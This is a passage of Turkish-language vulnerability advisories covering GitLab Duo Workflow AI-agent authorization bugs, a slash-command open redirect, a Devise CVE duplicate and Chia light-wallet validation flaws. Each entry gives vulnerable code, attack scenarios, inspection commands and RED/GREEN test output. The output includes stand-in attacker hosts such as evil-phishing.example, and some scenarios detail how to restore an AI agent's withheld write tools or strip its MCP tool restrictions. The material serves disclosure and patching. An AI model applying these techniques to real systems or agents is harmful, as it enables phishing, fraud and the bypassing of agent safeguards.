* **Senaryo A — Salt-Okunur Kısıtlı Sohbet (`chat`) Oturumunu Tam Yazma Yetkili Ajan Oturumuna Dönüştürerek Projelerde Yetkisiz İşlem Yapma:** Kurumsal politika gereği yalnızca soru-cevap (`chat`) yapmasına izin verilen ve yazma araçları (`withheld_tools`) kapatılmış bir Duo Workflow oturumunda, saldırgan `GET /api/v4/ai/duo_workflows/ws` WebSocket bağlantısına `workflow_definition` ve yabancı bir `ai_catalog_item_version_id` göndererek **engellenmiş yazma araçlarını (`create_issue`, MR/yorum yazma araçları) aktif hale getirir (`unapproved_write_tool_injected: true`) ve yapay zeka ajanına yasaklı yazma işlemlerini doğrudan uygulatır.**
* **Senaryo B — Rakip Şirketlerin / Özel Projelerin Gizli (`public: false`) Yapay Zeka Ajanlarının Araç ve Sistem Yapılandırmasını Çalma:** `McpConfigService#item_version` (`mcp_config_service.rb:134`) içinde `:read_ai_catalog_item` yetki kontrolü unutulduğu için, saldırgan ardışık `ai_catalog_item_version_id` numaralarını göndererek **erişim yetkisi olmayan gizli (`public: false`) kurumsal AI ajanlarının hangi iç araçları ve MCP sunucularını kullandığını tamamen ifşa eder.**
* **Senaryo C — İş Akışı Oluştururken (`POST /api/v4/ai/duo_workflows/workflows`) Yetkisiz Özel Ajan Sürümü Bağlama:** `workflows.rb:341-344` doğrudan `ItemVersion.find` çağırdığı için başka bir organizasyona ait özel ajan sürümü iş akışı kaydına kalıcı olarak bağlanır.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Compare line 134 vs line 334 in ee/app/services/ai/duo_workflows/mcp_config_service.rb
sed -n '130,136p;330,337p' \
  /home/community-user/targets/gitlab/ee/app/services/ai/duo_workflows/mcp_config_service.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report3_cand08
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "REPORT-03_CAND-08": {
    "GREEN": {
      "automated_issue_created_without_prompt": false,
      "downstream_victim_project_tools_call_status": 404,
      "unapproved_write_tool_injected": false,
      "workflow_definition_overridden": false
    },
    "RED": {
      "automated_issue_created_without_prompt": true,
      "downstream_victim_project_tools_call_status": 404,
      "unapproved_write_tool_injected": true,
      "workflow_definition_overridden": true
    },
    "patches": {
      "GITLAB-CAND-08-WORKFLOW-ITEM-VERSION-AUTHZ.patch": "d40f6e104c2fba0e8900cab8d45ddfb4cf9c49a60c8bb12e3aa573ddb1228704"
    }
  }
}
```


---

### III.17 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — AI Catalog Agent Üzerinde Organizasyon Kapsamsız `McpServer` GID Bağlama ve `McpConfigService#execute` Yerleşik `:gitlab` Anahtar Çarpışmasıyla Workhorse `withheld_server_tools` (`allToolsAvailable = true`) Kısıtlamasının Aşılması (`GITLAB-CAND-07`) (`CWE-863 / CWE-639`, CVSS `8.1 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems & Go / GitLab EE & Workhorse: gitlab-ee`)
* **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:57-64`, `ee/app/services/ai/catalog/mcp_servers/list_service.rb:14-24`, `workhorse/internal/ai_assist/duoworkflow/mcp.go:254`
* **Zafiyet Sınıfı & Skor:** `CWE-863 / CWE-639` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/tr/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `McpConfigService#execute` İçinde `.except(:orbit)` Kullanılıp `:gitlab` Anahtarının Unutulması (`mcp_config_service.rb:59-63`):** `McpConfigService#execute`, `gitlab_mcp_server(denied).merge(orbit_mcp_server).merge(ai_catalog_mcp_servers.except(:orbit))` çağrısıyla MCP yapılandırmasını oluşturur. Geliştirici `:orbit` anahtarını ezilmeye karşı korurken `:gitlab` anahtarını (`.except(:gitlab, :orbit, :slack)`) unutmuştur. Bu nedenle adı `"GitLab"` (`server_key => :gitlab`) olan bir `Ai::Catalog::McpServer` kaydı, yerleşik `:gitlab` yapılandırmasını ve `:Tools` izin listesini tamamen ezer.
2. **Adım 2 — Workhorse İçinde `s.cfg.Tools == nil` Nedeniyle `allToolsAvailable = true` Olması (`mcp.go:210, 254`):** Katalog MCP sunucuları `:Tools` anahtarı içermediği (`nil`) için, Workhorse `serverName == "gitlab"` olduğunda yine dahili `/api/v4/mcp` uç noktasına bağlanır ancak `mcp.go:254` satırında `allToolsAvailable := s.cfg.Tools == nil` (`true`) hesaplayarak `withheld_server_tools(denied)` araç yasağını tamamen devre dışı bırakır.
3. **Adım 3 — Organizasyon Kapsamsız (`in_organization` Eksik) `McpServer` GID Bağlama (`list_service.rb:14-24`):** `Agent::Create`, `Agent::Update` ve `ListService`, `McpServer` kimliklerini `.in_organization` kontrolü yapmadan çözer.

```ruby
// File: ee/app/services/ai/duo_workflows/mcp_config_service.rb (lines 59-63)
        gitlab_mcp_server(denied)
          .merge(orbit_mcp_server)
          .merge(ai_catalog_mcp_servers.except(:orbit)) # BUG 1: Forgot :gitlab! Overwrites gitlab_mcp_server(denied)[:gitlab]
          .merge(slack_mcp_server)

// File: workhorse/internal/ai_assist/duoworkflow/mcp.go (lines 210, 254)
	internal := serverName == "gitlab" || serverName == "orbit"
...
	allToolsAvailable := s.cfg.Tools == nil // BUG 2: Catalog entry has Tools == nil -> allToolsAvailable becomes true!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — `"GitLab"` Adlı Katalog Sunucusuyla Tüm Yerleşik GitLab AI Güvenlik Kısıtlamalarını (`withheld_server_tools`) Sıfırlama (`allToolsAvailable = true`):** GitLab Duo Workflow, yerleşik `:gitlab` MCP sunucusunda tehlikeli araçları `withheld_server_tools(denied)` listesiyle engeller. Ancak `McpConfigService#execute` yalnızca `.except(:orbit)` kullanıp `:gitlab` anahtarını korumadığı için, saldırgan `"GitLab"` adında (`server_key => :gitlab`, `Tools: nil`) bir katalog sunucusu bağladığında yerleşik `:gitlab` kaydının üzerine yazılır. Workhorse (`mcp.go:254`) `Tools == nil` gördüğü için **`allToolsAvailable = true` yapar ve yerleşik GitLab MCP sunucusundaki TÜM araç kısıtlamalarını kaldırarak yasaklı araçların tamamını kullanıma açar (`workhorse_all_tools_available: true`).**
* **Senaryo B — GraphQL `aiCatalogAgentCreate` / `Update` İle Başka Organizasyonun Özel `McpServer` Sunucularını Kendi Ajanına Bağlama:** `ListService` ve GraphQL mutasyonlarında `.in_organization` kontrolü olmadığı için saldırgan başka bir organizasyona ait `gid://gitlab/Ai::Catalog::McpServer/<ID>` kaydını kendi ajanına bağlayarak organizasyon izolasyonunu deler.
* **Senaryo C — Yerleşik `:gitlab` Kimlik Başlıklarını (`X-Gitlab-Oauth-Token`) Ezerek Tüm Duo Workflow Hizmetini Çökertme (`401` DoS):** Çarpışan `:gitlab` kaydı `X-Gitlab-Oauth-Token` başlığını `{}` ile ezdiği için yerleşik `/api/v4/mcp` çağrılarının tamamı `401 Unauthorized` hatasıyla çöker.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect .except(:orbit) in McpConfigService and allToolsAvailable in Workhorse mcp.go
grep -n -C 5 "except(:orbit)" /home/community-user/targets/gitlab/ee/app/services/ai/duo_workflows/mcp_config_service.rb
grep -n -C 5 "allToolsAvailable :=" /home/community-user/targets/gitlab/workhorse/internal/ai_assist/duoworkflow/mcp.go

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report4_cand07
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "REPORT-04_CAND-07": {
    "GREEN": {
      "builtin_gitlab_overwritten": false,
      "effective_gitlab_url": "http://127.0.0.1/api/v4/mcp",
      "effective_tools_filter": [
        "get_issue",
        "list_commits"
      ],
      "workhorse_all_tools_available": false
    },
    "RED": {
      "builtin_gitlab_overwritten": true,
      "effective_gitlab_url": "https://attacker-controlled-mcp.example/sse",
      "effective_tools_filter": null,
      "workhorse_all_tools_available": true
    },
    "patches": {
      "GITLAB-CAND-07-AGENT-MCP-CROSS-ORG-AND-KEY-COLLISION.patch": "8fc8646b4681d8d558cf25d2adc1c9ccd89363809243f17e9a79134956567f60"
    }
  }
}
```


---

### III.18 — GitLab (`<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — `Projects::Integrations::SlashCommandsController#confirm` Üzerinde Doğrulanmamış `redirect_url` Açık Yönlendirmesi, Bağlamsız `response_url` ve Projeler Arası Redis `CACHE_KEY` Çarpışması (`GITLAB-CAND-04`) (`CWE-601 / CWE-863`, CVSS `5.4 Medium`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
* **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/projects/integrations/slash_commands_controller.rb:21-48`, `app/models/concerns/integrations/base/slash_commands.rb:6-10, 68-76`
* **Zafiyet Sınıfı & Skor:** `CWE-601 / CWE-863` — **CVSS v3.1: `5.4 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/tr/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — `raise_on_open_redirects = false` Ayarıyla Doğrudan `redirect_to request_params[:redirect_url]` Çağrılması (`slash_commands_controller.rb:26`):** `show` aksiyonu (satır 11) yönlendirme adresini güvenli `integration_redirect_url` metodundan hesaplarken, `confirm` aksiyonu (satır 26) doğrudan kullanıcıdan gelen `request_params[:redirect_url]` parametresine `redirect_to` yapar.
2. **Adım 2 — Redis'teki `cached_params[:response_url]` Yerine `request_params[:response_url]` Kullanılması (`slash_commands_controller.rb:25`):** `VerifyRequest.new` çağrısına önbellekteki değer yerine doğrudan form/sorgu parametresi olan `request_params[:response_url]` verilir.
3. **Adım 3 — Redis `CACHE_KEY` İçinde `project_id` ve `integration_id` Bağlamasının Olmaması (`slash_commands.rb:9`):** `CACHE_KEY = "slash-command-requests:%{secret}"` yalnızca `command_id` ile anahtarlandığından, Proje B'de üretilen bir `command_id` Proje A'nın `/slash_commands/confirm` uç noktasında geçerli kabul edilir.

```ruby
// File: app/controllers/projects/integrations/slash_commands_controller.rb (lines 21-28, 41-48)
      def confirm
        if valid_request? && valid_user?
          # BUG 1: Uses request_params[:response_url] instead of cached_params[:response_url]
          Gitlab::SlashCommands::VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!
          # BUG 2: Redirects to unvalidated request_params[:redirect_url] (raise_on_open_redirects = false)
          redirect_to request_params[:redirect_url]
        else
...
      def cache_key
        @cache_key ||= Kernel.format(
          ::Integrations::Base::SlashCommands::CACHE_KEY, # BUG 3: "slash-command-requests:%{secret}" has no project_id/integration_id!
          secret: request_params[:command_id]
        )
      end
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Güvenilir Şirket GitLab Onay Ekranı Üzerinden Geliştirici Şifre ve 2FA Kodu Çalma (`302 Found` Açık Yönlendirme):** Bir geliştirici Slack/Mattermost üzerinden gelen Slash komutunu onaylamak için resmi şirket GitLab bağlantısına (`https://gitlab.sirket.com/.../slash_commands/confirm?command_id=...&redirect_url=https://sahte-gitlab-sso.example/login`) tıklayıp **Onayla** düğmesine bastığı anda, GitLab `redirect_url` parametresini doğrulamadan (`raise_on_open_redirects = false`) kullanıcıyı doğrudan saldırganın sahte SSO giriş ekranına (`302 Found`) yönlendirir (`open_redirect_triggered: true`). Geliştirici resmi GitLab akışında olduğunu sanarak kurumsal şifresini ve 2FA kodunu saldırgana kaptırır.
* **Senaryo B — Projeler Arası (`Project B -> Project A`) Redis Anahtarı Çarpışmasıyla Kurbanın ChatOps Hesabını Hedef Projeye Bağlama:** Redis `CACHE_KEY` anahtarı `project_id` ve `integration_id` içermediği için, saldırgan kendi projesinde (`Project B`) ürettiği geçerli `command_id` değerini üretim projesinin (`Project A`) onay URL'sinde kullanır (`cross_project_cache_collision_accepted: true`) ve kurban onay verdiğinde `ChatName` kimliği hedef projeye bağlanır.
* **Senaryo C — `request_params[:response_url]` Manipülasyonuyla ChatOps Onay Geri Çağrısını Saldırgan Sunucusuna Yönlendirme:** `confirm` aksiyonu Redis'teki `cached_params[:response_url]` yerine istekten gelen `request_params[:response_url]` parametresini `VerifyRequest#approve!` metoduna ilettiği için, onaylanan ChatOps bildirimi orijinal Slack/Mattermost kanalı yerine saldırganın sunucusuna gönderilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect confirm and cache_key in Projects::Integrations::SlashCommandsController
sed -n '10,48p' \
  /home/community-user/targets/gitlab/app/controllers/projects/integrations/slash_commands_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report5_cand04
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "REPORT-05_CAND-04": {
    "GREEN": {
      "cross_project_cache_collision_accepted": false,
      "http_status": 404,
      "location_header": "",
      "open_redirect_triggered": false
    },
    "RED": {
      "cross_project_cache_collision_accepted": true,
      "http_status": 302,
      "location_header": "https://evil-phishing.example/oauth/callback?steal=1",
      "open_redirect_triggered": true
    }
  }
}
```


---

### III.19 — GitLab (`<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)`) — `[ÜST AKIŞ DUPLICATE: CVE-2026-40295 — MITRE'YE GÖNDERİLMEDİ]` `Gitlab::DeviseFailure#redirect_url` Harici `Referer` Açık Yönlendirme Ürün Etkisi (`CVE-2026-40295`) ve Dinamik OAuth PKCE Savunma Derinliği Notu (`GITLAB-CAND-03`) (`CWE-601 / CWE-345`, CVSS `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`)

> **Önemli Duplicate Notu:** Bu madde üst akış `Devise 5.0.3` (`CVE-2026-40295`) kaydının GitLab üzerindeki ürün etkisini ve `CAND-03` savunma derinliği yamasını şeffaflık amacıyla belgeler; mükerrer olduğu için MITRE CNA-LR'a yeni CVE başvurusu olarak **gönderilmemiştir**.

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE (Devise 5.0.3): gitlab-ce / gitlab-ee (devise 5.0.3)`)
* **Etkilenen Sürüm & Bileşenler:** `<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)` — `lib/gitlab/devise_failure.rb:4-18`, `lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`, `app/controllers/oauth/authorizations_controller.rb:316-330`
* **Zafiyet Sınıfı & Skor:** `CWE-601 / CWE-345` — **CVSS v3.1: `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/tr/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Önemli Duplicate (Mükerrer Kayıt) ve MITRE Gönderim Dışı Bildirimi:** Gönderim öncesi doğrulama kapımızda, `Gitlab::DeviseFailure#redirect_url` açık yönlendirme bulgusunun üst akış **Devise `5.0.3` `CVE-2026-40295`** kaydının GitLab üzerindeki ürün etkisi (duplicate) olduğu; `GITLAB-CAND-03` (`validate_pkce_for_dynamic_applications`) bulgusunun ise çalışma zamanında `Doorkeeper 5.9.3` (`config/initializers/doorkeeper.rb:158` `pkce_code_challenge_methods ['S256']`) tarafından engellendiği kanıtlanmıştır. Bu nedenle **bu belge şeffaflık ve savunma yaması amacıyla GitHub'da yayımlanmış, ancak mükerrer (duplicate) olduğu için MITRE CNA-LR'a yeni CVE başvurusu olarak GÖNDERİLMEMİŞTİR**.
2. **Adım 1 — Üst Akış `CVE-2026-40295` (`Devise 5.0.3`) Zafiyetinin `Gitlab::DeviseFailure` İçindeki Mekanizması (`lib/gitlab/devise_failure.rb:4-18`):** `warden_message == :timeout` durumu `GET` dışındaki bir istekte (`POST` vb.) tetiklendiğinde, `Devise::FailureApp#redirect_url` metodu `extract_path_from_location(request.referrer)` ile alan adını temizlemeden doğrudan harici `request.referrer` URL'sini döndürür.
3. **Adım 2 — `Oauth::AuthorizationsController#validate_pkce_for_dynamic_applications` Savunma Derinliği Notu (`authorizations_controller.rb:326`, `GITLAB-CAND-03`):** Satır 326'daki `return unless code_challenge_method.present? && code_challenge_method != 'S256'` ifadesi `code_challenge_method` boş (`nil`) bırakıldığında erken çıkış yapar; çalışma zamanında Doorkeeper `5.9.3` bunu engellese de denetleyici katmanı `return if code_challenge_method == 'S256'` olarak yamalanmıştır.

```ruby
// File: lib/gitlab/devise_failure.rb (lines 4-18) — Upstream Devise 5.0.3 CVE-2026-40295 Remediation
module Gitlab
  class DeviseFailure < Devise::FailureApp
    # Inherits Devise::FailureApp#redirect_url which returns raw request.referrer on non-GET :timeout
    # Remediated by overriding redirect_url to apply extract_path_from_location(request.referrer)
  end
end

// File: app/controllers/oauth/authorizations_controller.rb (lines 323-329) — GITLAB-CAND-03 Defense-in-Depth
    code_challenge_method = permitted_params[:code_challenge_method]
    return unless code_challenge_method.present? && code_challenge_method != 'S256' # Early return when nil!
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — `GET` Dışı Oturum Zaman Aşımında Harici `Referer` Yönlendirmesi (`CVE-2026-40295` Duplicate):** Oturumu zaman aşımına uğrayan (`:timeout`) bir kullanıcının `POST` isteğinde harici `Referer` başlığı bulunduğunda, yamasız `Devise 5.0.3` yalnızca dosya yolunu almak yerine doğrudan harici URL'ye `302` yönlendirmesi yapar.
* **Senaryo B — `Gitlab::DeviseFailure#redirect_url` İçinde Uygulama Katmanı Yaması:** `lib/gitlab/devise_failure.rb` içinde `extract_path_from_location(request.referrer)` kullanılarak üst akış gem güncellemesini beklemeden açık yönlendirme kapatılır.
* **Senaryo C — Denetleyici Katmanında PKCE `S256` Zorunluluğu (`GITLAB-CAND-03` Defense-in-Depth):** `return if code_challenge_method == 'S256'` yaması ile `AuthorizationsController` katmanındaki erken çıkış hatası giderilir.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect Gitlab::DeviseFailure and AuthorizationsController#validate_pkce_for_dynamic_applications
sed -n '1,20p' /home/community-user/targets/gitlab/lib/gitlab/devise_failure.rb
sed -n '316,330p' /home/community-user/targets/gitlab/app/controllers/oauth/authorizations_controller.rb
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "GITLAB-DEVISE-CVE-2026-40295-REM_AND_CAND-03": {
    "upstream_cve_duplicate_status": "Duplicate of upstream Devise 5.0.3 CVE-2026-40295 (Not submitted to MITRE CNA-LR)",
    "RED": {
      "external_referer_redirect_on_non_get_timeout": true
    },
    "GREEN": {
      "external_referer_redirect_on_non_get_timeout": false,
      "path_extracted_only": true
    }
  }
}
```

<!-- GITLAB-ADVISORIES-END -->

<!-- CHIA-ADVISORIES-START -->

---

### III.20 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Hafif Cüzdan (Light Wallet) Senkronizasyonunda Doğrulanmamış `FoliageTransactionBlock` Takası İle Sıfır Sermayeli (`0 XCH`) Sahte Onaylı Yatırım (`WLC-01`) (`CWE-345 / CWE-347`, CVSS `9.1 Critical`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/wallet/wallet_node.py:926-995` (`_add_block_from_header`)
* **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-347` — **CVSS v3.1: `9.1 Critical`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md`](advisories/tr/20-CHIA-WLC-01-LIGHT-WALLET-FOLIAGE-BLOCK-SWAP-FAKE-DEPOSIT.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Başlık ve İşlem Gövdesi Arasındaki SHA-256 Bağlamasının Kontrol Edilmemesi (`chia/wallet/wallet_node.py:926-995`):** Chia blok yapısında imzalı blok başlığı (`HeaderBlock.foliage`), içindeki işlem blokunun özetini `header_block.foliage.foliage_transaction_block_hash` alanında tutar. Ancak `WalletNode._add_block_from_header` metodu P2P ağından gelen `RespondBlockHeader` paketini işlerken `header_block.foliage_transaction_block.get_hash() == header_block.foliage.foliage_transaction_block_hash` eşitliğini kontrol etmeyi unutur.
2. **Adım 2 — Cebinde `0 XCH` Olan Saldırganın Kurban Cüzdanına Sahte Onaylı Bakiye Yazması (`Karşı Onayı Gerekmez, Borsadan XCH Almak Gerekmez`):** Klasik çifte harcama (reorg) saldırılarının aksine saldırganın borsadan tek bir XCH bile satın almasına gerek yoktur (`0 XCH sermaye`). Saldırgan gerçek bir blok başlığının altına kendi ürettiği sahte `foliage_transaction_block` verisini takar; kurbanın cüzdanı zincirde hiç var olmayan `+0.5 XCH` (`500,000,000,000 mojo`) veya `+1.000 XCH` ödemeyi SQLite `WalletCoinStore` veritabanına **Onaylandı (Confirmed)** olarak kaydeder.
3. **Adım 3 — Satıcı Ödemeyi Teslim Ettikten Sonra Harcama Anında `Err.UNKNOWN_UNSPENT` Hatası:** Satıcı/OTC masası ekranda onaylı XCH yatırımını görüp karşılığında gerçek USDT, BTC veya ürünü teslim eder; daha sonra bu XCH'yi harcamak istediğinde `FullNode` mempool katmanı böyle bir coin zincirde hiç var olmadığı için işlemi `Err.UNKNOWN_UNSPENT` ile reddeder.

```python
# File: chia/wallet/wallet_node.py (lines 926-995)
async def _add_block_from_header(self, header_block: HeaderBlock, ...):
    # BUG: Missing cryptographic binding check between signed header and transaction block body:
    # if header_block.foliage_transaction_block is not None:
    #     if header_block.foliage_transaction_block.get_hash() != header_block.foliage.foliage_transaction_block_hash:
    #         raise ValueError("Invalid foliage_transaction_block_hash")
    additions, removals = await self.get_additions_and_removals(header_block, ...)
    await self.wallet_state_manager.add_block(...)
```

#### 3. Günlük Hayatta Yol Açabileceği 3 Kritik Senaryo (`Senaryo A / B / C`)
* **Senaryo A — Borsadan Hiç XCH Almadan (`0 XCH` Sermaye, Karşı Onayı Yok) Satıcıya/OTC Masasına Sahte Yatırım Gösterip Gerçek USDT/BTC Çekmek:** Klasik çifte harcama senaryosunda saldırganın gerçekten XCH satın alıp iki çatallı zincir üretmesi gerekirken, `WLC-01` açığında saldırganın cebinde `1 XCH` bile olmasına gerek yoktur! Karşı taraf (kripto ödeme noktası, OTC masası veya satıcı) Chia Light Wallet kullanıyorsa, saldırgan P2P ağından başlığı gerçek ama içindeki `foliage_transaction_block` listesi değiştirilmiş bir paket yollar. Satıcının cüzdanı blokzincirinde hiç var olmayan `+0.5 XCH` (`500,000,000,000 mojo`) veya `+1.000 XCH` ödemeyi **Onaylandı** gösterir; saldırgan karşılığında gerçek USDT, Bitcoin veya ürünü alıp çıkar.
* **Senaryo B — SQLite Veritabanında Kalıcı Sahte Bakiye İle Otomatik Teslimat Botlarını Kandırma:** Sahte coin SQLite `WalletCoinStore` tablosuna yazıldığı için cüzdan yeniden başlatılsa bile (`reopened_sqlite_coin_present: true`) onaylı görünmeye devam eder; ancak satıcı bu bakiyeyi başka adrese göndermeye çalıştığında `FullNode` işlemi `Err.UNKNOWN_UNSPENT` ile reddeder.
* **Senaryo C — Birleşik Zincir (`CONS-SP-01` FullNode Senkron Kilidi + `WLC-01` Sahte Yatırım):** Saldırgan önce `8444` portundan `CONS-SP-01` ile hedef kurumun FullNode senkronizasyonunu kilitler, ardından hafif cüzdan P2P senkronizasyonu üzerinden `foliage_transaction_block` takasıyla sahte XCH bakiyesi enjekte eder.

#### 4. Örnek Çalıştırma, Tetikleme ve Doğrulama Komutları
```bash
# 1. Inspect _add_block_from_header in chia/wallet/wallet_node.py
sed -n '926,995p' /home/community-user/targets/chia-blockchain/chia/wallet/wallet_node.py

# 2. Run the RED -> GREEN End-to-End Verification Harness for WLC-01
CHIA_DETACHED_GREEN=0 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_ek_kanit_gereksinimleri_20261030.py -k wlc01
CHIA_DETACHED_GREEN=1 /home/community-user/targets/chia-blockchain/.venv/bin/pytest -q \
  /home/community-user/targets/chia-audit/work/composite-chain-proofs/test_chia_ek_kanit_gereksinimleri_20261030.py -k wlc01
```
**Gözlemlenen Çalışma Zamanı Kanıtı (`RED -> GREEN`):**
```json
{
  "CHIA-WLC-01": {
    "RED": {
      "attacker_initial_xch_capital_mojo": 0,
      "accepted_swapped_foliage_transaction_block": true,
      "fake_merchant_deposit_increase_mojo": 500000000000,
      "reopened_sqlite_coin_present": true,
      "subsequent_spend_mempool_error": "Err.UNKNOWN_UNSPENT"
    },
    "GREEN": {
      "accepted_swapped_foliage_transaction_block": false,
      "fake_merchant_deposit_increase_mojo": 0,
      "reopened_sqlite_coin_present": false,
      "rejection_error": "ValueError: Invalid foliage_transaction_block_hash"
    }
  }
}
```


---

### III.21 — Chia-Network/chia-blockchain (`<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)`) — Chia Cüzdanında Doğrulanmamış `RespondRemovals` / `RespondCoinState` İle Hayalet Harcanmış (`Spent`) Zehirlemesi ve Zaman Kilitli Clawback İptal Kilidi (`WLC-02`) (`CWE-345 / CWE-400`, CVSS `7.5 High`)

#### 1. Üst Veri & Bildirim Durumu
* **Hedef Depo & Paket:** `Chia-Network/chia-blockchain` (`PyPI / Python: chia-blockchain`)
* **Etkilenen Sürüm & Bileşenler:** `<= 2.7.5 (verified on commit bdb7be2a45fc459b0672656166701ac4f46e0cfc)` — `chia/wallet/wallet_node.py:725-777`, `chia/wallet/wallet_state_manager.py:1735-1778`
* **Zafiyet Sınıfı & Skor:** `CWE-345 / CWE-400` — **CVSS v3.1: `7.5 High`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H`)
* **Sniper Tekil Raporu:** [`docs/advisories/tr/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md`](advisories/tr/21-CHIA-WLC-02-CLAWBACK-PHANTOM-SPENT-POISONING-LOCKOUT.md)

#### 2. Açığın Kodda Nasıl Oluştuğu ve Zafiyete Dönüştüğü (Herkesin Anlayabileceği Adım Adım Anlatım)
1. **Adım 1 — Kanıtsız (`proofs=None`) `RespondRemovals` / `spent_height` Bildiriminin Doğrulanmadan Kabul Edilmesi (`wallet_node.py:725-777` & `wallet_state_manager.py:1735-1778`):** Cüzdan P2P ağından gelen `RespondRemovals(height=8, coins=[(coin_name, None)], proofs=None)` mesajını işlerken, blok başlığına bağlı Merkle silinme kanıtını (`validate_removals`) doğrulamadan SQLite `WalletCoinStore` içinde coin'i `spent_height=8` (harcanmış) olarak işaretler.
